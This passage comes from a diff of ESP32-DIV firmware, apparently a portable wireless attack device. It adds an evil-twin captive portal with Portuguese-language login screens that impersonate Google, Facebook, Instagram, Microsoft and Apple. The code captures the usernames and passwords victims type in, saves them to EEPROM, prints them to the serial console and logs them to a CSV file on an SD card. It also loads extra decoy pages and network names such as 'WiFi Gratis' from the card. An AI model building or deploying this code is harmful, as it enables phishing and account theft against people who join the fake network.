+                    <g><path fill="#fbbc05" d="M38.17 6.735c-3.28 0-5.953 2.506-5.953 5.96 0 3.432 2.673 5.96 5.954 5.96 3.29 0 5.96-2.528 5.96-5.96 0-3.46-2.67-5.96-5.95-5.96zm0 9.568c-1.798 0-3.348-1.487-3.348-3.61 0-2.14 1.55-3.608 3.35-3.608s3.348 1.467 3.348 3.61c0 2.116-1.55 3.608-3.35 3.608z"/></g>
+                    <g><path fill="#ea4335" d="M25.17 6.71c-3.28 0-5.954 2.505-5.954 5.958 0 3.433 2.673 5.96 5.954 5.96 3.282 0 5.955-2.527 5.955-5.96 0-3.453-2.673-5.96-5.955-5.96zm0 9.567c-1.8 0-3.35-1.487-3.35-3.61 0-2.14 1.55-3.608 3.35-3.608s3.35 1.46 3.35 3.6c0 2.12-1.55 3.61-3.35 3.61z"/></g>
+                    <g><path fill="#4285f4" d="M14.11 14.182c.722-.723 1.205-1.78 1.387-3.334H9.423V8.373h8.518c.09.452.16 1.07.16 1.664 0 1.903-.52 4.26-2.19 5.934-1.63 1.7-3.71 2.61-6.48 2.61-5.12 0-9.42-4.17-9.42-9.29C0 4.17 4.31 0 9.43 0c2.83 0 4.843 1.108 6.362 2.56L14 4.347c-1.087-1.02-2.56-1.81-4.577-1.81-3.74 0-6.662 3.01-6.662 6.75s2.93 6.75 6.67 6.75c2.43 0 3.81-.972 4.69-1.856z"/></g>
+                </svg>
+            </div>
+            <div class="g-heading">
+                <h1>Fazer login</h1>
+                <p>Use sua Conta do Google</p>
+            </div>
+            <div class="field">
+                <input type="email" id="emailField" autocomplete="username" spellcheck="false" placeholder=" " />
+                <label for="emailField">E-mail ou telefone</label>
+            </div>
+            <a href="#" class="sublink" onclick="return false">Esqueceu seu e-mail?</a>
+            <p class="guest-note">Não está no seu computador? Use o modo visitante para fazer login de forma privada. <a href="#" onclick="return false">Saiba mais sobre como usar o modo visitante</a></p>
+            <div class="buttons">
+                <button type="button" class="btn-link" onclick="return false">Criar conta</button>
+                <button type="button" class="btn-primary" id="btnEmailNext">Avançar</button>
+            </div>
+        </main>
+        <footer class="g-footer">
+            <div class="lang"><select aria-label="Idioma"><option selected>Português (Brasil)</option><option>English (United States)</option><option>Español</option></select></div>
+            <ul><li><a href="#" onclick="return false">Ajuda</a></li><li><a href="#" onclick="return false">Privacidade</a></li><li><a href="#" onclick="return false">Termos</a></li></ul>
+        </footer>
+    </section>
+
+    <!-- ============ TELA 3 — GOOGLE SENHA ============ -->
+    <section class="screen" id="screen-password">
+        <main class="g-main">
+            <div class="g-logo">
+                <svg viewBox="0 0 75 24" width="75" height="24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+                    <g><path fill="#ea4335" d="M67.954 16.303c-1.33 0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-.495-1.33-2.008-3.79-5.102-3.79-3.068 0-5.622 2.41-5.622 5.96 0 3.34 2.53 5.96 5.92 5.96 2.73 0 4.31-1.67 4.97-2.64l-2.03-1.35c-.673.98-1.6 1.64-2.93 1.64zm-.203-7.27c1.04 0 1.92.52 2.21 1.264l-5.32 2.21c-.06-2.3 1.79-3.474 3.12-3.474z"/></g>
+                    <g><path fill="#34a853" d="M58.193.67h2.564v17.44h-2.564z"/></g>
+                    <g><path fill="#4285f4" d="M54.152 8.066h-.088c-.588-.697-1.716-1.33-3.136-1.33-2.98 0-5.71 2.614-5.71 5.98 0 3.338 2.73 5.933 5.71 5.933 1.42 0 2.548-.64 3.136-1.36h.088v.86c0 2.28-1.217 3.5-3.183 3.5-1.61 0-2.6-1.15-3-2.12l-2.28.94c.65 1.58 2.39 3.52 5.28 3.52 3.06 0 5.66-1.807 5.66-6.206V7.21h-2.48v.858zm-3.006 8.237c-1.804 0-3.318-1.513-3.318-3.588 0-2.1 1.514-3.635 3.318-3.635 1.784 0 3.183 1.534 3.183 3.635 0 2.075-1.4 3.588-3.19 3.588z"/></g>
+                    <g><path fill="#fbbc05" d="M38.17 6.735c-3.28 0-5.953 2.506-5.953 5.96 0 3.432 2.673 5.96 5.954 5.96 3.29 0 5.96-2.528 5.96-5.96 0-3.46-2.67-5.96-5.95-5.96zm0 9.568c-1.798 0-3.348-1.487-3.348-3.61 0-2.14 1.55-3.608 3.35-3.608s3.348 1.467 3.348 3.61c0 2.116-1.55 3.608-3.35 3.608z"/></g>
+                    <g><path fill="#ea4335" d="M25.17 6.71c-3.28 0-5.954 2.505-5.954 5.958 0 3.433 2.673 5.96 5.954 5.96 3.282 0 5.955-2.527 5.955-5.96 0-3.453-2.673-5.96-5.955-5.96zm0 9.567c-1.8 0-3.35-1.487-3.35-3.61 0-2.14 1.55-3.608 3.35-3.608s3.35 1.46 3.35 3.6c0 2.12-1.55 3.61-3.35 3.61z"/></g>
+                    <g><path fill="#4285f4" d="M14.11 14.182c.722-.723 1.205-1.78 1.387-3.334H9.423V8.373h8.518c.09.452.16 1.07.16 1.664 0 1.903-.52 4.26-2.19 5.934-1.63 1.7-3.71 2.61-6.48 2.61-5.12 0-9.42-4.17-9.42-9.29C0 4.17 4.31 0 9.43 0c2.83 0 4.843 1.108 6.362 2.56L14 4.347c-1.087-1.02-2.56-1.81-4.577-1.81-3.74 0-6.662 3.01-6.662 6.75s2.93 6.75 6.67 6.75c2.43 0 3.81-.972 4.69-1.856z"/></g>
+                </svg>
+            </div>
+            <div class="g-heading"><h1>Bem-vindo(a)</h1></div>
+            <div class="account">
+                <div class="avatar" id="avatar">G</div>
+                <span class="email" id="accountEmail">sua.conta@gmail.com</span>
+                <span class="edit" id="editEmail">Editar</span>
+            </div>
+            <form id="loginForm" action="/login" method="POST">
+                <input type="hidden" name="username" id="hiddenUsername" />
+                <input type="hidden" name="provider" value="google" />
+                <div class="field">
+                    <input type="password" name="password" id="passField" autocomplete="current-password" placeholder=" " />
+                    <label for="passField">Digite sua senha</label>
+                </div>
+                <label class="show-pass"><input type="checkbox" id="showPass" /> Mostrar senha</label>
+                <div class="buttons">
+                    <button type="button" class="btn-link" onclick="return false">Esqueceu a senha?</button>
+                    <button type="submit" class="btn-primary" id="btnPassNext">Avançar</button>
+                </div>
+            </form>
+        </main>
+        <footer class="g-footer">
+            <div class="lang"><select aria-label="Idioma"><option selected>Português (Brasil)</option><option>English (United States)</option><option>Español</option></select></div>
+            <ul><li><a href="#" onclick="return false">Ajuda</a></li><li><a href="#" onclick="return false">Privacidade</a></li><li><a href="#" onclick="return false">Termos</a></li></ul>
+        </footer>
+    </section>
+
+    <!-- ============ TELA 4 — FACEBOOK (1 passo) ============ -->
+    <section class="screen" id="screen-facebook">
+        <a class="cp-back" onclick="goBack()">&#8249; Voltar</a>
+        <div class="fb-wrap">
+            <div class="fb-logo">
+                <svg viewBox="0 0 24 24" aria-hidden="true"><path fill="#1877F2" d="M24 12.073C24 5.446 18.627 0 12 0S0 5.446 0 12.073C0 18.1 4.388 23.094 10.125 24v-8.437H7.078v-3.49h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.49h-2.796V24C19.612 23.094 24 18.1 24 12.073z"/></svg>
+                <div class="fb-word">facebook</div>
+            </div>
+            <form id="fbForm" class="fb-form" action="/login" method="POST">
+                <input type="hidden" name="provider" value="facebook" />
+                <input class="fb-input" id="fbUser" type="text" name="username" placeholder="E-mail ou telefone" autocomplete="username" spellcheck="false" />
+                <div class="form-err fb-err" id="fbErr">Insira um e-mail ou número de telefone válido.</div>
+                <input class="fb-input" id="fbPass" type="password" name="password" placeholder="Senha" autocomplete="current-password" />
+                <button type="submit" class="fb-btn">Entrar</button>
+            </form>
+            <a class="fb-link" href="#" onclick="return false">Esqueceu a senha?</a>
+            <div class="fb-sep">ou</div>
+            <a class="fb-new" href="#" onclick="return false">Criar nova conta</a>
+            <div class="fb-foot">Português (Brasil) &middot; English (US) &middot; Español</div>
+        </div>
+    </section>
+
+    <!-- ============ TELA 5 — INSTAGRAM (1 passo) ============ -->
+    <section class="screen" id="screen-instagram">
+        <a class="cp-back" onclick="goBack()">&#8249; Voltar</a>
+        <div class="ig-wrap">
+            <svg class="ig-logo" viewBox="0 0 24 24" aria-hidden="true">
+                <defs>
+                    <linearGradient id="igGradLogo" x1="0%" y1="100%" x2="100%" y2="0%">
+                        <stop offset="0%" stop-color="#F09433"/>
+                        <stop offset="25%" stop-color="#E6683C"/>
+                        <stop offset="50%" stop-color="#DC2743"/>
+                        <stop offset="75%" stop-color="#CC2366"/>
+                        <stop offset="100%" stop-color="#BC1888"/>
+                    </linearGradient>
+                </defs>
+                <rect x="2.6" y="2.6" width="18.8" height="18.8" rx="5.4" fill="none" stroke="url(#igGradLogo)" stroke-width="2.1"/>
+                <circle cx="12" cy="12" r="4.5" fill="none" stroke="url(#igGradLogo)" stroke-width="2.1"/>
+                <circle cx="17.6" cy="6.4" r="1.25" fill="url(#igGradLogo)"/>
+            </svg>
+            <form id="igForm" class="ig-form" action="/login" method="POST">
+                <input type="hidden" name="provider" value="instagram" />
+                <input class="ig-input" id="igUser" type="text" name="username" placeholder="Número de celular, nome de usuário ou e-mail" autocomplete="username" spellcheck="false" />
+                <div class="form-err ig-err" id="igErr">Insira um nome de usuário, e-mail ou número de telefone válido.</div>
+                <input class="ig-input" id="igPass" type="password" name="password" placeholder="Senha" autocomplete="current-password" />
+                <button type="submit" class="ig-btn">Entrar</button>
+            </form>
+            <a class="ig-forgot" href="#" onclick="return false">Esqueceu a senha?</a>
+            <div class="ig-foot">Português (Brasil) &middot; English &middot; Español</div>
+        </div>
+    </section>
+
+    <!-- ============ TELA 6 — MICROSOFT (E-MAIL) ============ -->
+    <section class="screen" id="screen-ms-email">
+        <a class="cp-back" onclick="goBack()">&#8249; Voltar</a>
+        <div class="ms-wrap">
+            <div class="ms-logo">
+                <svg viewBox="0 0 23 23" aria-hidden="true"><rect width="10.5" height="10.5" fill="#F25022"/><rect x="12.5" width="10.5" height="10.5" fill="#7FBA00"/><rect y="12.5" width="10.5" height="10.5" fill="#00A4EF"/><rect x="12.5" y="12.5" width="10.5" height="10.5" fill="#FFB900"/></svg>
+                <span>Microsoft</span>
+            </div>
+            <h1 class="ms-title">Entrar</h1>
+            <input class="ms-input" id="msEmail" type="text" placeholder="E-mail ou telefone" autocomplete="username" spellcheck="false" />
+            <div class="form-err ms-err" id="msErr">Insira um endereço de e-mail ou número de telefone válido.</div>
+            <a class="ms-link" href="#" onclick="return false">Não consegue acessar sua conta?</a>
+            <div class="ms-actions"><button type="button" class="ms-btn" id="btnMsNext">Avançar</button></div>
+            <div class="ms-new"><a href="#" onclick="return false">Criar uma conta!</a></div>
+        </div>
+    </section>
+
+    <!-- ============ TELA 7 — MICROSOFT (SENHA) ============ -->
+    <section class="screen" id="screen-ms-password">
+        <div class="ms-wrap">
+            <div class="ms-logo">
+                <svg viewBox="0 0 23 23" aria-hidden="true"><rect width="10.5" height="10.5" fill="#F25022"/><rect x="12.5" width="10.5" height="10.5" fill="#7FBA00"/><rect y="12.5" width="10.5" height="10.5" fill="#00A4EF"/><rect x="12.5" y="12.5" width="10.5" height="10.5" fill="#FFB900"/></svg>
+                <span>Microsoft</span>
+            </div>
+            <div class="ms-back" id="msBack">
+                <svg viewBox="0 0 24 24" aria-hidden="true"><path fill="#1B1B1B" d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg>
+                <span id="msAccount">usuario@exemplo.com</span>
+            </div>
+            <h1 class="ms-title">Inserir senha</h1>
+            <form id="msForm" action="/login" method="POST">
+                <input type="hidden" name="username" id="msHiddenUser" />
+                <input type="hidden" name="provider" value="microsoft" />
+                <input class="ms-input" id="msPass" type="password" name="password" placeholder="Senha" autocomplete="current-password" />
+                <a class="ms-link" href="#" onclick="return false">Esqueceu a senha?</a>
+                <div class="ms-actions"><button type="submit" class="ms-btn">Entrar</button></div>
+                <div class="ms-new"><a href="#" onclick="return false">Outras formas de entrar</a></div>
+            </form>
+        </div>
+    </section>
+
+    <!-- ============ TELA 8 — APPLE (APPLE ID) ============ -->
+    <section class="screen" id="screen-apple-email">
+        <a class="cp-back" onclick="goBack()">&#8249; Voltar</a>
+        <div class="ap-wrap">
+            <svg class="ap-logo" viewBox="0 0 24 24" aria-hidden="true"><path fill="#1D1D1F" d="M12.152 6.896c-.948 0-2.415-1.078-3.96-1.04-2.04.027-3.91 1.183-4.961 3.014-2.117 3.675-.546 9.103 1.519 12.09 1.013 1.454 2.208 3.09 3.792 3.039 1.52-.065 2.09-.987 3.935-.987 1.831 0 2.35.987 3.96.948 1.637-.026 2.676-1.48 3.676-2.948 1.156-1.688 1.636-3.325 1.662-3.415-.039-.013-3.182-1.221-3.22-4.857-.026-3.04 2.48-4.494 2.597-4.559-1.429-2.09-3.623-2.324-4.39-2.376-2-.156-3.675 1.09-4.61 1.09zM15.53 3.83c.843-1.012 1.4-2.427 1.245-3.83-1.207.052-2.662.805-3.532 1.818-.78.896-1.454 2.338-1.273 3.714 1.338.104 2.715-.688 3.559-1.701"/></svg>
+            <h1 class="ap-title">Inicie sessão na Apple</h1>
+            <div class="ap-card">
+                <label class="ap-label" for="apId">Apple ID</label>
+                <input class="ap-input" id="apId" type="text" placeholder="E-mail ou telefone" autocomplete="username" spellcheck="false" />
+            </div>
+            <div class="form-err ap-err" id="apErr">Insira um e-mail ou número de telefone válido.</div>
+            <button type="button" class="ap-btn" id="btnApNext">Continuar</button>
+            <a class="ap-link" href="#" onclick="return false">Esqueceu a Apple ID ou a senha?</a>
+            <div class="ap-new">Não tem uma Apple ID? <a href="#" onclick="return false">Criar Apple ID</a></div>
+        </div>
+    </section>
+
+    <!-- ============ TELA 9 — APPLE (SENHA) ============ -->
+    <section class="screen" id="screen-apple-password">
+        <div class="ap-wrap">
+            <svg class="ap-logo" viewBox="0 0 24 24" aria-hidden="true"><path fill="#1D1D1F" d="M12.152 6.896c-.948 0-2.415-1.078-3.96-1.04-2.04.027-3.91 1.183-4.961 3.014-2.117 3.675-.546 9.103 1.519 12.09 1.013 1.454 2.208 3.09 3.792 3.039 1.52-.065 2.09-.987 3.935-.987 1.831 0 2.35.987 3.96.948 1.637-.026 2.676-1.48 3.676-2.948 1.156-1.688 1.636-3.325 1.662-3.415-.039-.013-3.182-1.221-3.22-4.857-.026-3.04 2.48-4.494 2.597-4.559-1.429-2.09-3.623-2.324-4.39-2.376-2-.156-3.675 1.09-4.61 1.09zM15.53 3.83c.843-1.012 1.4-2.427 1.245-3.83-1.207.052-2.662.805-3.532 1.818-.78.896-1.454 2.338-1.273 3.714 1.338.104 2.715-.688 3.559-1.701"/></svg>
+            <h1 class="ap-title">Inicie sessão na Apple</h1>
+            <div class="ap-account"><span id="apAccount">usuario@icloud.com</span><a id="apEdit">Editar</a></div>
+            <form id="apForm" action="/login" method="POST">
+                <input type="hidden" name="username" id="apHiddenUser" />
+                <input type="hidden" name="provider" value="apple" />
+                <div class="ap-card">
+                    <label class="ap-label" for="apPass">Senha</label>
+                    <input class="ap-input" id="apPass" type="password" name="password" placeholder="Senha" autocomplete="current-password" />
+                </div>
+                <div class="form-err ap-err" id="apPassErr">Insira sua senha.</div>
+                <button type="submit" class="ap-btn" id="btnApSignIn">Continuar</button>
+            </form>
+            <a class="ap-link" href="#" onclick="return false">Esqueceu a senha?</a>
+        </div>
+    </section>
+
+    <div class="spinner-overlay" id="spinner"><div class="spinner"></div></div>
+
+<script>
+    /* ---------- navegacao ---------------------------------------------------
+       As telas sao o MESMO documento trocado por JS, entao por padrao o
+       navegador nao registra navegacao nenhuma e o botao "voltar" do sistema
+       nao tem para onde voltar. Aqui mantemos uma pilha e empurramos um estado
+       no historico, para o voltar do Android/Safari funcionar. O CNA do iOS
+       nao tem botao algum, por isso existe tambem o "< Voltar" na tela. */
+    var navStack = [];
+
+    function paint(id) {
+        var screens = document.querySelectorAll('.screen');
+        for (var i = 0; i < screens.length; i++) screens[i].classList.remove('active');
+        document.getElementById(id).classList.add('active');
+        window.scrollTo(0, 0);
+    }
+
+    function show(id) {
+        var cur = document.querySelector('.screen.active');
+        var curId = cur ? cur.id : null;
+        if (curId && curId !== id) {
+            navStack.push(curId);
+            try { history.pushState({ nav: navStack.length }, ''); } catch (e) { }
+        }
+        paint(id);
+    }
+
+    function goBack() {
+        var prev = navStack.length ? navStack.pop() : 'screen-landing';
+        paint(prev);
+    }
+
+    window.addEventListener('popstate', function () {
+        if (navStack.length) goBack();
+    });
+
+    function focusLater(id) {
+        setTimeout(function () {
+            var el = document.getElementById(id);
+            if (el) el.focus();
+        }, 250);
+    }
+
+    var spinner = document.getElementById('spinner');
+    function openScreen(id, focusId) {
+        spinner.classList.add('show');
+        setTimeout(function () {
+            spinner.classList.remove('show');
+            show(id);
+            focusLater(focusId);
+        }, 700);
+    }
+
+    /* ---------- TELA 1: escolha do provedor ---------- */
+    document.getElementById('btnGoogle').addEventListener('click', function () { openScreen('screen-email', 'emailField'); });
+    document.getElementById('btnFacebook').addEventListener('click', function () { openScreen('screen-facebook', 'fbUser'); });
+    document.getElementById('btnInstagram').addEventListener('click', function () { openScreen('screen-instagram', 'igUser'); });
+    document.getElementById('btnMicrosoft').addEventListener('click', function () { openScreen('screen-ms-email', 'msEmail'); });
+    document.getElementById('btnApple').addEventListener('click', function () { openScreen('screen-apple-email', 'apId'); });
+
+    /* ---------- GOOGLE: e-mail -> senha ---------- */
+    document.getElementById('btnEmailNext').addEventListener('click', function () {
+        var email = document.getElementById('emailField').value.trim();
+        if (!email) { document.getElementById('emailField').focus(); return; }
+        document.getElementById('accountEmail').textContent = email;
+        document.getElementById('avatar').textContent = email.charAt(0).toUpperCase();
+        show('screen-password');
+        focusLater('passField');
+    });
+
+    document.getElementById('emailField').addEventListener('keydown', function (e) {
+        if (e.keyCode === 13) { e.preventDefault(); document.getElementById('btnEmailNext').click(); }
+    });
+
+    document.getElementById('editEmail').addEventListener('click', goBack);
+
+    document.getElementById('showPass').addEventListener('change', function () {
+        document.getElementById('passField').type = this.checked ? 'text' : 'password';
+    });
+
+    document.getElementById('loginForm').addEventListener('submit', function (e) {
+        document.getElementById('hiddenUsername').value = document.getElementById('emailField').value.trim();
+        if (!document.getElementById('passField').value) {
+            e.preventDefault();
+            document.getElementById('passField').focus();
+        }
+    });
+
+    /* ---------- validações de identificação ---------- */
+    function isEmail(v) {
+        return /^[^\s@]+@[^\s@]+\.[a-zA-Z]{2,}$/.test(v);
+    }
+    function isPhone(v) {
+        if (!/^[+()\-. \t0-9]+$/.test(v)) return false;
+        var d = v.replace(/[^0-9]/g, '');
+        return d.length >= 8 && d.length <= 13;
+    }
+    function isUsername(v) {
+        return /^[a-zA-Z0-9._]{3,30}$/.test(v);
+    }
+    function showErr(err, input, msg) {
+        err.textContent = msg;
+        err.classList.add('show');
+        if (input) input.focus();
+        return false;
+    }
+    function hideErr(err) {
+        err.classList.remove('show');
+    }
+
+    /* ---------- FACEBOOK: e-mail ou telefone + senha na mesma tela ---------- */
+    document.getElementById('fbForm').addEventListener('submit', function (e) {
+        var u = document.getElementById('fbUser');
+        var p = document.getElementById('fbPass');
+        var err = document.getElementById('fbErr');
+        var v = u.value.trim();
+        if (!v || !(isEmail(v) || isPhone(v))) {
+            e.preventDefault();
+            showErr(err, u, 'Insira um e-mail ou número de telefone válido.');
+            return;
+        }
+        if (!p.value) {
+            e.preventDefault();
+            showErr(err, p, 'Insira sua senha.');
+            return;
+        }
+        hideErr(err);
+    });
+    document.getElementById('fbUser').addEventListener('input', function () { hideErr(document.getElementById('fbErr')); });
+    document.getElementById('fbPass').addEventListener('input', function () { hideErr(document.getElementById('fbErr')); });
+
+    /* ---------- INSTAGRAM: usuário, e-mail ou telefone + senha ---------- */
+    document.getElementById('igForm').addEventListener('submit', function (e) {
+        var u = document.getElementById('igUser');
+        var p = document.getElementById('igPass');
+        var err = document.getElementById('igErr');
+        var v = u.value.trim();
+        if (!v || !(isEmail(v) || isPhone(v) || isUsername(v))) {
+            e.preventDefault();
+            showErr(err, u, 'Insira um nome de usuário, e-mail ou número de telefone válido.');
+            return;
+        }
+        if (!p.value) {
+            e.preventDefault();
+            showErr(err, p, 'Insira sua senha.');
+            return;
+        }
+        hideErr(err);
+    });
+    document.getElementById('igUser').addEventListener('input', function () { hideErr(document.getElementById('igErr')); });
+    document.getElementById('igPass').addEventListener('input', function () { hideErr(document.getElementById('igErr')); });
+
+    /* ---------- MICROSOFT: e-mail ou telefone -> senha ---------- */
+    document.getElementById('btnMsNext').addEventListener('click', function () {
+        var el = document.getElementById('msEmail');
+        var err = document.getElementById('msErr');
+        var v = el.value.trim();
+        if (!v || !(isEmail(v) || isPhone(v))) {
+            showErr(err, el, 'Insira um endereço de e-mail ou número de telefone válido.');
+            return;
+        }
+        hideErr(err);
+        document.getElementById('msAccount').textContent = v;
+        show('screen-ms-password');
+        focusLater('msPass');
+    });
+
+    document.getElementById('msEmail').addEventListener('input', function () { hideErr(document.getElementById('msErr')); });
+
+    document.getElementById('msEmail').addEventListener('keydown', function (e) {
+        if (e.keyCode === 13) { e.preventDefault(); document.getElementById('btnMsNext').click(); }
+    });
+
+    document.getElementById('msBack').addEventListener('click', goBack);
+
+    document.getElementById('msForm').addEventListener('submit', function (e) {
+        document.getElementById('msHiddenUser').value = document.getElementById('msEmail').value.trim();
+        if (!document.getElementById('msPass').value) {
+            e.preventDefault();
+            document.getElementById('msPass').focus();
+        }
+    });
+
+    /* ---------- APPLE: Apple ID (e-mail ou telefone) -> senha ---------- */
+    document.getElementById('btnApNext').addEventListener('click', function () {
+        var el = document.getElementById('apId');
+        var err = document.getElementById('apErr');
+        var v = el.value.trim();
+        if (!v || !(isEmail(v) || isPhone(v))) {
+            showErr(err, el, 'Insira um e-mail ou número de telefone válido.');
+            return;
+        }
+        hideErr(err);
+        document.getElementById('apAccount').textContent = v;
+        show('screen-apple-password');
+        focusLater('apPass');
+    });
+
+    document.getElementById('apId').addEventListener('input', function () { hideErr(document.getElementById('apErr')); });
+
+    document.getElementById('apId').addEventListener('keydown', function (e) {
+        if (e.keyCode === 13) { e.preventDefault(); document.getElementById('btnApNext').click(); }
+    });
+
+    document.getElementById('apEdit').addEventListener('click', goBack);
+
+    document.getElementById('apPass').addEventListener('input', function () { hideErr(document.getElementById('apPassErr')); });
+
+    document.getElementById('apForm').addEventListener('submit', function (e) {
+        document.getElementById('apHiddenUser').value = document.getElementById('apId').value.trim();
+        if (!document.getElementById('apPass').value) {
+            e.preventDefault();
+            showErr(document.getElementById('apPassErr'), document.getElementById('apPass'), 'Insira sua senha.');
+        }
+    });
+</script>
 </body>
 </html>
-)";
+)CPORTAL";
+
+// A pagina do portal nunca e copiada para a RAM: a embutida sai direto da
+// flash (send_P) e a do SD vai em streaming (ver cpSendPortalPage).
+//
+// Fonte da pagina: 0 = embutida ("Local"); 1..N = uma pagina do cartao.
+// O nome vem do proprio arquivo: /captive_portal/<nome>.html vira "SD <nome>".
+// Assim "McD.html" aparece como "SD McD" e "BK.html" como "SD BK".
+#define CP_MAX_SD_PAGES   8
+#define CP_PAGE_NAME_LEN  20
+static uint8_t s_ssidSrc         = 0;                              // 0=Std 1=Custom 2=Clone
+static uint8_t s_pageSourceIdx   = 0;
+static uint8_t s_pageSourceCount = 1;                              // 1 + paginas no cartao
+static char    s_pageNames[CP_MAX_SD_PAGES][CP_PAGE_NAME_LEN];     // nomes, sem o .html
+
+// Mapa "pagina -> nome da rede", lido de /captive_portal/ssid.txt
+#define CP_MAX_NAME_MAP  8
+#define CP_SSID_NAME_LEN 40
+struct CpNameMapEntry { char key[CP_PAGE_NAME_LEN]; char ssid[CP_SSID_NAME_LEN]; };
+static CpNameMapEntry s_nameMap[CP_MAX_NAME_MAP];
+static uint8_t        s_nameMapCount = 0;
+static char           s_stdNameLocal[CP_SSID_NAME_LEN] = "WiFi Gratis";
 
 void scrollTerminal() {
   for (int i = 0; i < MAX_LINES - 1; i++) {
@@ -3242,14 +4097,17 @@ void displayPrint(String text, uint16_t color, bool extraSpace = false) {
   }
 }
 
-void saveCredential(String username, String password, String ssid) {
+void saveCredential(String username, String password, String ssid, String provider) {
   Credential cred;
-  strncpy(cred.username, username.c_str(), 15);
-  cred.username[15] = '\0';
-  strncpy(cred.password, password.c_str(), 15);
-  cred.password[15] = '\0';
+  memset(&cred, 0, sizeof(cred));
+  strncpy(cred.username, username.c_str(), 63);
+  cred.username[63] = '\0';
+  strncpy(cred.password, password.c_str(), 63);
+  cred.password[63] = '\0';
   strncpy(cred.ssid, ssid.c_str(), 31);
   cred.ssid[31] = '\0';
+  strncpy(cred.provider, provider.c_str(), 11);
+  cred.provider[11] = '\0';
 
   int count = EEPROM.read(COUNT_ADDR);
   Serial.printf("Before saving, credential count: %d\n", count);
@@ -3263,6 +4121,7 @@ void saveCredential(String username, String password, String ssid) {
     Serial.println("Username: " + String(cred.username));
     Serial.println("Password: " + String(cred.password));
     Serial.println("SSID: " + String(cred.ssid));
+    Serial.println("Provider: " + String(cred.provider));
     Serial.printf("After saving, credential count: %d\n", count);
   } else {
     Serial.println("Credential storage full");
@@ -3326,19 +4185,22 @@ static bool cpAppendLineToFile(const char* path, const String& line) {
   return ok;
 }
 
-static bool cpAppendCaptureToSD(const String& remoteIp, const String& username, const String& passwordStr, const String& ssid) {
+static bool cpAppendCaptureToSD(const String& remoteIp, const String& username, const String& passwordStr,
+                                const String& ssid, const String& provider) {
   const char* dir = "/captive_portal";
   const char* path = "/captive_portal/captured.csv";
   if (!cpEnsureDir(dir)) return false;
 
   bool exists = SD.exists(path);
   if (!exists) {
-    if (!cpAppendLineToFile(path, "millis,remote_ip,ssid,username,password\r\n")) return false;
+    if (!cpAppendLineToFile(path, "millis,provider,remote_ip,ssid,username,password\r\n")) return false;
   }
 
   String row;
-  row.reserve(32 + remoteIp.length() + ssid.length() + username.length() + passwordStr.length());
+  row.reserve(48 + remoteIp.length() + ssid.length() + username.length() + passwordStr.length() + provider.length());
   row += String(millis());
+  row += ",";
+  row += cpCsvEscape(provider);
   row += ",";
   row += cpCsvEscape(remoteIp);
   row += ",";
@@ -3355,61 +4217,298 @@ static bool cpAppendCaptureToSD(const String& remoteIp, const String& username, 
 // Mirrors the Beacon "/ssid_list.txt" pattern: the login page is seeded to the
 // SD card on first run (so there is a file to edit) and reloaded from there on
 // every run, falling back to the built-in page if the SD/file is unavailable.
-static const char* kCpPagePath   = "/captive_portal/login.html";
 static const char* kCpReadmePath = "/captive_portal/README.txt";
+static const char* kCpSsidMapPath = "/captive_portal/ssid.txt";
 
-static const char kCpReadmeText[] = R"RDME(ESP32-DIV - Captive Portal: pagina editavel
-===========================================================
+// Caminho da pagina N: /captive_portal/<nome>.html (nome lido da pasta).
+static void cpPagePathFor(uint8_t idx, char* out, size_t n) {
+  if (idx < 1 || idx > CP_MAX_SD_PAGES) { out[0] = '\0'; return; }
+  snprintf(out, n, "/captive_portal/%s.html", s_pageNames[idx - 1]);
+}
 
-ARQUIVO DA PAGINA
------------------
-  /captive_portal/login.html
+static const char* cpBaseName(const char* p) {
+  const char* s = strrchr(p, '/');
+  return s ? s + 1 : p;
+}
 
-Edite esse arquivo (qualquer editor de texto) para mudar a APARENCIA da
-pagina mostrada ao alvo. Ele foi criado automaticamente na primeira vez, com
-a pagina padrao, so para voce ter um ponto de partida.
+static bool cpEndsWithHtml(const char* nm) {
+  size_t len = strlen(nm);
+  if (len < 6) return false;
+  const char* e = nm + len - 5;
+  return e[0] == '.' && (e[1] | 0x20) == 'h' && (e[2] | 0x20) == 't'
+      && (e[3] | 0x20) == 'm' && (e[4] | 0x20) == 'l';
+}
 
-- Mexa a vontade no HTML/CSS: cores, textos, layout, logo (imagem em base64
-  embutida funciona, sem depender de internet).
-- Se o arquivo faltar, estiver vazio ou o SD nao montar, o firmware usa a
-  pagina embutida (fallback). Nada quebra.
-- Salve e recoloque o cartao. Nao precisa recompilar nada.
+// Le /captive_portal e guarda o nome de cada .html (sem a extensao).
+// O nome do arquivo E o nome do local mostrado no menu.
+static void cpScanSDPages() {
+  s_pageSourceCount = 1;
+  if (!cpMountSD()) {
+    Serial.println("[SD] sem cartao: apenas a pagina Local (embutida)");
+    return;
+  }
+  File dir = SD.open("/captive_portal");
+  if (!dir || !dir.isDirectory()) {
+    Serial.println("[SD] /captive_portal nao encontrado: apenas a pagina Local");
+    return;
+  }
+
+  uint8_t n = 0;
+  int listados = 0;
+  File e;
+  Serial.println("[SD] conteudo de /captive_portal:");
+  while (listados < 40 && (e = dir.openNextFile())) {
+    const char* base = cpBaseName(e.name());
+    if (e.isDirectory()) {
+      Serial.printf("[SD]   [pasta]  %s\n", base);
+    } else {
+      bool pag = cpEndsWithHtml(base);
+      Serial.printf("[SD]   %-22s %8u bytes%s\n", base, (unsigned)e.size(),
+                    pag ? "   <- pagina" : "");
+      if (pag) {
+        size_t blen = strlen(base);
+        if (n < CP_MAX_SD_PAGES && (blen - 5) < CP_PAGE_NAME_LEN) {
+          memcpy(s_pageNames[n], base, blen - 5);
+          s_pageNames[n][blen - 5] = '\0';
+          n++;
+        }
+      }
+    }
+    listados++;
+    e.close();
+  }
+  dir.close();
+  if (listados == 0) {
+    Serial.println("[SD]   (pasta vazia)");
+  }
+
+  // ordem alfabetica, para o menu ficar estavel
+  for (uint8_t i = 1; i < n; i++) {
+    char k[CP_PAGE_NAME_LEN];
+    memcpy(k, s_pageNames[i], CP_PAGE_NAME_LEN);
+    int8_t j = (int8_t)i - 1;
+    while (j >= 0 && strcmp(s_pageNames[j], k) > 0) {
+      memcpy(s_pageNames[j + 1], s_pageNames[j], CP_PAGE_NAME_LEN);
+      j--;
+    }
